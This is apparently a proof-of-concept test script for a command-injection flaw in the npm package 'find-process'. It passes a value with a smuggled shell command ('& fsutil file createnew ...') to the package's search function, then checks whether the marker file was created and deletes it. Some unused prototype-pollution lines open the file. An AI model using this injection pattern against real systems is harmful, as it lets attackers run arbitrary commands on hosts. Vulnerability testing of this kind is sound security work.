var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const find = require('find-process');
const fs = require('fs');
const path = './find-process';
const command = '& fsutil file createnew find-process 0';
console.log(find('pid', command).then(function (list) {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
}, function (err) {
}));